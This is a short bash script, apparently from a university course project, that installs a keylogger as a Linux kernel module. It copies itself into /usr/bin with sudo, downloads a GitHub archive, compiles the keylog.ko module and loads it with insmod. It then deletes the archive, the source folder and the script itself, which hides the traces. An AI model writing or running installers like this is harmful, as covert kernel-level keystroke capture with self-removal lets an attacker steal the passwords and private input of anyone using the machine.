#!/bin/bash

# chromd 755 install_keylog.sh

sudo cp install_keylog.sh /usr/bin/install_keylog
wget -q https://github.com/ECS153/final-project-click-to-add-lemon/archive/master.zip -O keylog.zip

unzip -o -q keylog.zip
cd final-project-click-to-add-lemon-master/Source/
make -s
sudo insmod keylog.ko

cd ../..
rm -r -f keylog.zip install_keylog.sh
rm -r -f final-project-click-to-add-lemon-master
